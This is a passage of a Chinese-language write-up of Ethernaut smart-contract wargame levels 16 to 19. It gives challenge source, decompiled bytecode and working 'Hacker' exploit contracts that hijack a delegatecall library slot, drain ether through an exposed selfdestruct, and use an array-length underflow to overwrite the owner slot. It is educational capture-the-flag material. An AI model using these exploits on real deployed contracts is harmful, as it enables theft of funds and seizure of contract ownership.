&#125;</span><br><span class="line">    </span><br><span class="line">        func_0041(var2, var3);</span><br><span class="line">        stop();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">func_0041</span>(<span class="params">var arg0, var arg1</span>) </span>&#123;</span><br><span class="line">        arg0 = msg.data[arg0:arg0 + <span class="number">0x20</span>];</span><br><span class="line">        storage[<span class="number">0x00</span>] = arg0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>思路是先调用修改timeZone1Library的地址，然后delegatecall执行任意代码。</p>
<h2 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface Preservation &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setFirstTime</span>(<span class="params">uint _timeStamp</span>) <span class="title">external</span>;</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">ClaimOwnership</span> </span>&#123;</span><br><span class="line">    address public timeZone1Library;  <span class="comment">// 0</span></span><br><span class="line">    address public timeZone2Library;  <span class="comment">// 1</span></span><br><span class="line">    address public owner;             <span class="comment">// 2</span></span><br><span class="line">    fallback() external &#123;</span><br><span class="line">        owner = <span class="number">0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hacker &#123;</span><br><span class="line">    address target = <span class="number">0x4464A38441e76713439883883752A60B02C24298</span>;</span><br><span class="line">    address new_library;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        new_library = address (<span class="keyword">new</span> ClaimOwnership());</span><br><span class="line">        Preservation t = Preservation(target);</span><br><span class="line">        t.setFirstTime(uint256(uint160(new_library)));</span><br><span class="line">        t.setFirstTime(<span class="number">0</span>);</span><br><span class="line">        selfdestruct(payable(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Insights"><a href="#Insights" class="headerlink" title="Insights"></a>Insights</h2><p>As the previous level, delegate mentions, the use of delegatecall to call libraries can be risky. This is particularly true for contract “<code>libraries</code>“ that have their own state. This example demonstrates why the <code>library</code> <strong>keyword should be used</strong> for building libraries, as <strong>it prevents the libraries from storing and accessing state variables</strong>.</p>
<p>library变量存取state是非常危险的，所以library关键字避免了这个行为。</p>
<h1 id="Level-17-Recovery"><a href="#Level-17-Recovery" class="headerlink" title="Level 17. Recovery"></a>Level 17. Recovery</h1><blockquote>
<p>A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.5 ether to obtain more tokens. They have since lost the contract address.</p>
<p>This level will be completed if you can recover (or remove) the 0.5 ether from the lost contract address.</p>
</blockquote>
<h2 id="Source-11"><a href="#Source-11" class="headerlink" title="Source"></a>Source</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'@openzeppelin/contracts/math/SafeMath.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract Recovery &#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//generate tokens</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">generateToken</span>(<span class="params">string memory _name, uint256 _initialSupply</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">new</span> SimpleToken(_name, msg.sender, _initialSupply);</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  using SafeMath <span class="keyword">for</span> uint256;</span><br><span class="line">  <span class="comment">// public variables</span></span><br><span class="line">  string public name;</span><br><span class="line">  mapping (<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// constructor</span></span><br><span class="line">  <span class="keyword">constructor</span>(string memory _name, address _creator, uint256 _initialSupply) public &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// collect ether in return for tokens</span></span><br><span class="line">  fallback() external payable &#123;</span><br><span class="line">    balances[msg.sender] = msg.value.mul(<span class="number">10</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// allow transfers of tokens</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint _amount</span>) <span class="title">public</span> </span>&#123; </span><br><span class="line">    <span class="built_in">require</span>(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] = balances[msg.sender].sub(_amount);</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// clean up after ourselves</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params">address payable _to</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analysis-2"><a href="#Analysis-2" class="headerlink" title="Analysis"></a>Analysis</h2><p>没看懂题目是啥意思？也不说清楚啥地址lost了。考的是暴露的selfdestruct？</p>
<h2 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface SimpleToken &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">destroy</span>(<span class="params">address payable _to</span>) <span class="title">external</span>;</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Hacker</span> </span>&#123;</span><br><span class="line">    address target = <span class="number">0xdED8992B6FEF8BEB0326Ef93dc34E5e7Ba2dF78C</span>;</span><br><span class="line">    address payable hacker = payable (<span class="number">0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        SimpleToken(target).destroy(hacker);</span><br><span class="line">        selfdestruct(payable(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Level-18-MagicNumber"><a href="#Level-18-MagicNumber" class="headerlink" title="Level 18. MagicNumber"></a>Level 18. MagicNumber</h1><blockquote>
<p>To solve this level, you only need to provide the Ethernaut with a “Solver”, a contract that responds to “whatIsTheMeaningOfLife()” with the right number.</p>
<p>The solver’s code needs to be really tiny. Really reaaaaaallly tiny. Like freakin’ really really itty-bitty tiny: 10 opcodes at most.</p>
</blockquote>
<h2 id="Source-12"><a href="#Source-12" class="headerlink" title="Source"></a>Source</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.6</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract MagicNum &#123;</span><br><span class="line"></span><br><span class="line">  address public solver;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">constructor</span>() public &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setSolver</span>(<span class="params">address _solver</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    solver = _solver;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    ____________/\\\_______/\\\\\\\\\_____        </span></span><br><span class="line"><span class="comment">     __________/\\\\\_____/\\\///////\\\___       </span></span><br><span class="line"><span class="comment">      ________/\\\/\\\____\///______\//\\\__      </span></span><br><span class="line"><span class="comment">       ______/\\\/\/\\\______________/\\\/___     </span></span><br><span class="line"><span class="comment">        ____/\\\/__\/\\\___________/\\\//_____    </span></span><br><span class="line"><span class="comment">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span></span><br><span class="line"><span class="comment">          _\///////////\\\//____/\\\/___________  </span></span><br><span class="line"><span class="comment">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span></span><br><span class="line"><span class="comment">            ___________\///_____\///////////////__</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analysis-3"><a href="#Analysis-3" class="headerlink" title="Analysis"></a>Analysis</h2><p>意思是只要返回42就行？</p>
<p>bytes类型永远会在首部存储长度字段的</p>
<h2 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h2><p>emmm用mstore8是过不了的，必须用mstore</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface MagicNum &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">setSolver</span>(<span class="params">address _solver</span>) <span class="title">external</span>;</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Solver</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            602a push 42</span></span><br><span class="line"><span class="comment">            6000 push 0</span></span><br><span class="line"><span class="comment">            52   mstore</span></span><br><span class="line"><span class="comment">            6020 push 0x20</span></span><br><span class="line"><span class="comment">            6000 push 0</span></span><br><span class="line"><span class="comment">            f3   return</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        bytes memory code = hex<span class="string">'602a60005260206000f3'</span>;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            <span class="keyword">return</span>(add(code,<span class="number">0x20</span>),mload(code))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hacker &#123;   </span><br><span class="line">    address target = <span class="number">0x8FD22bb410240144B69382a85157630f52537FbB</span>;</span><br><span class="line">    address solver = address(<span class="keyword">new</span> Solver());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        MagicNum(target).setSolver(solver);</span><br><span class="line">        selfdestruct(payable(solver));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="Level-19-Alien-Codex"><a href="#Level-19-Alien-Codex" class="headerlink" title="Level 19. Alien Codex"></a>Level 19. Alien Codex</h1><blockquote>
<p>You’ve uncovered an Alien contract. Claim ownership to complete the level.</p>
</blockquote>
<h2 id="Source-13"><a href="#Source-13" class="headerlink" title="Source"></a>Source</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.5</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'../helpers/Ownable-05.sol'</span>;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier contacted() &#123;</span><br><span class="line">    assert(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">make_contact</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    contact = <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">record</span>(<span class="params">bytes32 _content</span>) <span class="title">contacted</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">  	codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">retract</span>(<span class="params"></span>) <span class="title">contacted</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">revise</span>(<span class="params">uint i, bytes32 _content</span>) <span class="title">contacted</span> <span class="title">public</span> </span>&#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Analysis-4"><a href="#Analysis-4" class="headerlink" title="Analysis"></a>Analysis</h2><p>看一下反编译的revise和retract发现可以直接用retract整数下溢后用revise任意storage写。</p>
<p>逆向的结果：在索引数组<code>codex[i] = _content</code>时总会有边界检查，<code>codex.length--</code>会把新旧之间的数组元素全部清零。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">retract</span>(<span class="params"></span>) </span>&#123; <span class="comment">//检查contacted修饰符</span></span><br><span class="line">  <span class="keyword">if</span> (!(storage[<span class="number">0x00</span>] / <span class="number">0x0100</span> ** <span class="number">0x14</span> &amp; <span class="number">0xff</span>)) &#123; assert(); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> var0 = storage[<span class="number">0x01</span>];</span><br><span class="line">  <span class="keyword">var</span> var1 = <span class="number">0x02d2</span>;</span><br><span class="line">  <span class="keyword">var</span> var2 = <span class="number">0x01</span>;</span><br><span class="line">  <span class="keyword">var</span> var3 = var0 - <span class="number">0x01</span>;</span><br><span class="line">  func_06E5(var2, var3);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func_06E5</span>(<span class="params">var arg0, var arg1</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> temp0 = arg0;<span class="comment">//1</span></span><br><span class="line">    <span class="keyword">var</span> temp1 = storage[temp0]; <span class="comment">// s[1]</span></span><br><span class="line">    <span class="keyword">var</span> var0 = temp1;<span class="comment">// s[1] : 0</span></span><br><span class="line">    <span class="keyword">var</span> temp2 = arg1;<span class="comment">// -1</span></span><br><span class="line">    storage[temp0] = temp2; <span class="comment">// newlen : 0xff..fff</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (var0 &lt;= temp2) &#123;  <span class="comment">//如果 oldlen &lt;= newlen</span></span><br><span class="line">    label_070C:</span><br><span class="line">        <span class="keyword">return</span>; <span class="comment">// 整数下溢，走这条分支</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 可能是pop数组的操作，把减掉之后和原来长度之间的storage全部变成0</span></span><br><span class="line">        memory[<span class="number">0x00</span>:<span class="number">0x20</span>] = arg0;  <span class="comment">// 1</span></span><br><span class="line">        <span class="keyword">var</span> temp3 = keccak256(memory[<span class="number">0x00</span>:<span class="number">0x20</span>]); <span class="comment">//base addr</span></span><br><span class="line">        <span class="keyword">var</span> temp4 = temp3 + var0; <span class="comment">// large addr</span></span><br><span class="line">        var0 = <span class="number">0x070b</span>;</span><br><span class="line">        <span class="keyword">var</span> var2 = temp3 + arg1; <span class="comment">// small addr</span></span><br><span class="line">        <span class="keyword">var</span> var1 = temp4; <span class="comment">// large addr</span></span><br><span class="line">        var0 = func_0711(var1, var2);</span><br><span class="line">        goto label_070C;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">func_0711</span>(<span class="params">var arg0, var arg1</span>) <span class="title">returns</span> (<span class="params">var r0</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> temp0 = arg0; <span class="comment">// large</span></span><br><span class="line">    arg0 = <span class="number">0x0733</span>;</span><br><span class="line">    <span class="keyword">var</span> temp1 = arg1; <span class="comment">// small</span></span><br><span class="line">    arg1 = temp0; <span class="comment">// large</span></span><br><span class="line">    <span class="keyword">var</span> var0 = temp1; <span class="comment">//small</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (arg1 &lt;= var0) &#123; <span class="keyword">return</span> func_072F(arg1, var0); &#125;</span><br><span class="line"></span><br><span class="line">label_0720:</span><br><span class="line">    <span class="keyword">var</span> temp2 = var0; <span class="comment">// small</span></span><br><span class="line">    storage[temp2] = <span class="number">0x00</span>; <span class="comment">// 置0</span></span><br><span class="line">    var0 = temp2 + <span class="number">0x01</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (arg1 &gt; var0) &#123; goto label_0720; &#125;</span><br><span class="line"></span><br><span class="line">    arg0 = func_072F(arg1, var0);</span><br><span class="line">    <span class="comment">// Error: Could not resolve method call return address!</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">func_072F</span>(<span class="params">var arg0, var arg1</span>) <span class="title">returns</span> (<span class="params">var r0</span>) </span>&#123; <span class="keyword">return</span> arg0; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">revise</span>(<span class="params">var arg0, var arg1</span>) </span>&#123; <span class="comment">// 4 args</span></span><br><span class="line">  <span class="keyword">var</span> temp0 = arg0;</span><br><span class="line">  arg0 = msg.data[temp0:temp0 + <span class="number">0x20</span>];  <span class="comment">// i</span></span><br><span class="line">  arg1 = msg.data[temp0 + <span class="number">0x20</span>:temp0 + <span class="number">0x20</span> + <span class="number">0x20</span>];  <span class="comment">// content</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!(storage[<span class="number">0x00</span>] / <span class="number">0x0100</span> ** <span class="number">0x14</span> &amp; <span class="number">0xff</span>)) &#123; assert(); &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> var0 = arg1;</span><br><span class="line">  <span class="keyword">var</span> var1 = <span class="number">0x01</span>;</span><br><span class="line">  <span class="keyword">var</span> var2 = arg0;  <span class="comment">// i</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (var2 &gt;= storage[var1]) &#123; assert(); &#125;</span><br><span class="line"></span><br><span class="line">  memory[<span class="number">0x00</span>:<span class="number">0x20</span>] = var1;</span><br><span class="line">  storage[keccak256(memory[<span class="number">0x00</span>:<span class="number">0x20</span>]) + var2] = var0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">16</span>]: w3.keccak(<span class="string">b'\x01'</span>.rjust(<span class="number">0x20</span>,<span class="string">b'\x00'</span>))</span><br><span class="line">Out[<span class="number">16</span>]: HexBytes(<span class="string">'0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6'</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">17</span>]: w3.eth.get_storage_at(target,<span class="number">0</span>)</span><br><span class="line">Out[<span class="number">17</span>]: HexBytes(<span class="string">'0x000000000000000000000000da5b3fb76c78b6edee6be8f11a1c31ecfb02b272'</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">18</span>]: <span class="number">0x10000000000000000000000000000000000000000000000000000000000000000</span> - <span class="number">0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span></span><br><span class="line">Out[<span class="number">18</span>]: <span class="number">35707666377435648211887908874984608119992236509074197713628505308453184860938</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">19</span>]: hex(_)</span><br><span class="line">Out[<span class="number">19</span>]: <span class="string">'0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a'</span></span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line"></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface AlienCodex &#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">make_contact</span>(<span class="params"></span>) <span class="title">external</span>;</span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">retract</span>(<span class="params"></span>) <span class="title">external</span>;</span></span><br><span class="line"><span class="function">    <span class="title">function</span> <span class="title">revise</span>(<span class="params">uint i, bytes32 _content</span>) <span class="title">external</span>;</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Hacker</span> </span>&#123;</span><br><span class="line">    AlienCodex target = AlienCodex(<span class="number">0xD722Ca9C6655EBc031Ddb5FCff419d525ef66D13</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">constructor</span>() &#123;</span><br><span class="line">        target.make_contact();</span><br><span class="line">        target.retract();</span><br><span class="line">        bytes32 hacker = bytes32(uint(uint160(<span class="number">0x9B3754c0a0798aDe51e98c7a81aE73aAcf9C2e5F</span>)));</span><br><span class="line">        uint offset = (<span class="number">2</span>**<span class="number">256</span> - <span class="number">1</span>) - uint(keccak256(abi.encode(uint(<span class="number">1</span>)))) + <span class="number">1</span>;</span><br><span class="line">        target.revise(offset, hacker);</span><br><span class="line">        selfdestruct(payable(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">pure</span> <span class="title">returns</span> (<span class="params">uint</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">2</span>**<span class="number">256</span> - <span class="number">1</span>) - uint(keccak256(abi.encode(uint(<span class="number">1</span>)))) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Insights-1"><a href="#Insights-1" class="headerlink" title="Insights"></a>Insights</h2><blockquote>
<p>This level exploits the fact that the EVM doesn’t validate an array’s ABI-encoded length vs its actual payload.</p>
</blockquote>
<p>这个漏洞我好像没用到…?</p>
<h1 id="Level-20-Denial"><a href="#Level-20-Denial" class="headerlink" title="Level 20. Denial"></a>Level 20. Denial</h1><blockquote>
<p>This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.</p>
<p>If you can deny the owner from withdrawing funds when they call withdraw() (whilst the contract still has funds) you will win this level.</p>
</blockquote>
